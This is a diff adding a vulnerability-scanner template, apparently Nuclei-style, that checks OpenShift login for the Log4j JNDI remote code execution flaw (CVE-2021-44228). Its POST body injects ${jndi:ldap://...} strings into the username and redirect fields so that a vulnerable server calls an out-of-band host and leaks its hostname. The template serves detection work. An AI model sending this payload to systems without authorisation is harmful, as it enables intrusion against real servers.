@@ -1,0 +1,32 @@
+id: openshift-log4j-rce
+brief:
+    title: OpenShift - Remote Code Execution (Apache Log4j)
+    by: shaikhyaser
+    level: critical
+    about: OpenShift is susceptible to Log4j JNDI remote code execution. OpenShift is a unified platform to build, modernize, and deploy applications at scale.
+    label:
+        - cve
+        - cve2021
+        - rce
+        - jndi
+        - log4j
+        - openshift
+        - oast
+        - kev
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/Login'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+        Origin: '{{RootURL}}'
+        Referer: '{{RootURL}}/login?then=/oauth/authorize?client_id=openshift-web-console&idp=basic&redirect_uri={{BaseURL}}/console/oauth&response_type'
+      body: then=%2Foauth%2Fauthorize%3Fclient_id%3Dopenshift-web-console%26idp%3Dbasic%26redirect_uri%3D${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}26response_type%3Dcode&username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&password={{str}}
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
